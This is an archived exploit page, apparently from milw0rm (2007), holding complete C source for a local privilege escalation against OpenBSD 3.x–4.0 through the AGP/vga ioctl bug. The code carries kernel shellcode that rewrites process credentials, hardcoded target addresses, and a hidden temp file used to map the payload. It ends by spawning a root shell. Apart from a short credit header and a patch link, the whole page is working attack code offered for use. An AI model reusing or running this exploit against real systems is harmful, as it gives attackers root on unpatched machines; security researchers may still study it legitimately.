<html><head><title>OpenBSD 3.x - 4.0 vga_ioctl() Local Root Exploit</title></head><pre>/* 

Critical Security OpenBSD 3.x-4.0 vga_ioctl() root exploit 

Bug had been discovered by allmighty Ilja van Sprundel (ilja.netric.org) 
Some code had been stolen from noir's openbsd exploit sources 

Fix is available: 
ftp://ftp.openbsd.org/pub/OpenBSD/patches/4.0/i386/007_agp.patch 

Critical Security [http://www.critical.lt], Lithuania, Vilnius, 2007 

Linkejimai neegzistuojancio fronto kariams ;] 
*/ 

#include &lt;sys/param.h&gt; 
#include &lt;sys/ioctl.h&gt; 
#include &lt;sys/syscall.h&gt; 
#include &lt;sys/agpio.h&gt; 
#include &lt;unistd.h&gt; 
#include &lt;err.h&gt; 
#include &lt;fcntl.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;sys/types.h&gt; 
#include &lt;sys/stat.h&gt; 
#include &lt;sys/mman.h&gt; 
#include &lt;sys/sysctl.h&gt; 

#define TARGET1 &quot;\x51\x47\x48\xd0&quot;  /* 0xd0484751 obsd 4.0 generic i386*/ 
#define TARGET2 &quot;\xa9\x42\x10\xd0&quot;  /* 0xd01042a9 obsd 3.9 generic i386*/ 

char shellcode[]= 
&quot;\x18\x00\x00\x00&quot; 
&quot;\x18\x00\x00\x00&quot; 
&quot;\x18\x00\x00\x00&quot; /* some crap */ 
&quot;\x18\x00\x00\x00&quot; 
&quot;\x18\x00\x00\x00&quot; 

&quot;\x18\x00\x00\x00&quot; /* jmp 0x00000018 */ 

&quot;\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad&quot; 
&quot;\xde\xad\xde\xef\xbe\x90\x90\x90\x5f\x8b\x0f\x8b&quot; /* p_cred &amp; u_cred shellcode */ 
&quot;\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89\x42\x04&quot; 

&quot;\xb8\x51\x47\x48\xd0&quot; 
&quot;\xff\xe0&quot;; 

void usage() 
{ 
printf(&quot;Usage: crit_obsd_ex target\n\n&quot;); 
printf(&quot;valid targets:\n&quot;); 
printf(&quot;(1)\tobsd 4.0 generic i386\n&quot;); 
printf(&quot;(2)\tobsd 3.9 generic i386\n\n&quot;); 
exit(0); 
} 

void get_proc(pid_t pid, struct kinfo_proc *kp) 
{ 
   u_int arr[4], len; 

        arr[0] = CTL_KERN; 
        arr[1] = KERN_PROC; 
        arr[2] = KERN_PROC_PID; 
        arr[3] = pid; 
        len = sizeof(struct kinfo_proc); 
        if(sysctl(arr, 4, kp, &amp;len, NULL, 0) &lt; 0) { 
                perror(&quot;sysctl&quot;); 
                printf(&quot;this is an unexpected error, rerun!\n&quot;); 
                exit(-1); 
        } 
} 

int main(int ac, char *av[]) 
{ 
        int i; 
        void *p; 
        int fd,failas; 
        u_long  pprocadr; 
        struct kinfo_proc kp; 

printf(&quot;\n+--------------------------------------------+\n&quot;); 
printf(&quot;|     Critical Security local obsd root      |\n&quot;); 
printf(&quot;+--------------------------------------------+\n\n&quot;); 

if (ac&lt;2) usage(); 
if(atoi(av[1])==1) 
{ 
for(i=0;i&lt;4;i++)shellcode[61+i]=TARGET1[i]; 
} 
else if(atoi(av[1])==2) 
{ 
for(i=0;i&lt;4;i++)shellcode[61+i]=TARGET2[i]; 
} 
else {usage();} 

        get_proc((pid_t) getpid(), &amp;kp); 
        pprocadr = (u_long) kp.kp_eproc.e_paddr; 

        shellcode[24+5] = pprocadr &amp; 0xff; 
        shellcode[24+6] = (pprocadr &gt;&gt; 8) &amp; 0xff; 
        shellcode[24+7] = (pprocadr &gt;&gt; 16) &amp; 0xff; 
        shellcode[24+8] = (pprocadr &gt;&gt; 24) &amp; 0xff; 

        printf(&quot;[~] shellcode size: %d\n&quot;,sizeof(shellcode)); 

        fd=open(&quot;/tmp/. &quot;, O_RDWR|O_CREAT, S_IRUSR|S_IWUSR); 
        if(fd &lt; 0) 
                err(1, &quot;open&quot;); 

        write(fd, shellcode, sizeof(shellcode)); 
        if((lseek(fd, 0L, SEEK_SET)) &lt; 0) 
                err(1, &quot;lseek&quot;); 

        p=mmap(0, sizeof(shellcode), PROT_READ|PROT_EXEC, MAP_FIXED, fd, 0); 
        if (p == MAP_FAILED) 
        err(1, &quot;mmap&quot;); 

        printf(&quot;[~] map addr: 0x%x\n&quot;,p); 
        printf(&quot;[~] exploiting...\n&quot;); 
        failas = open(AGP_DEVICE, O_RDWR); 
        syscall(SYS_ioctl, failas, 0x80044103, NULL); 

        close(failas); 
        close(fd); 

        seteuid(0); 
        setuid(0); 
        printf(&quot;[~] uid: %d euid: %d gid: %d \n&quot;, getuid(), geteuid(),getgid()); 
        execl(&quot;/bin/sh&quot;, &quot;cyber&quot;, NULL); 

}

// milw0rm.com [2007-01-07]</pre></html>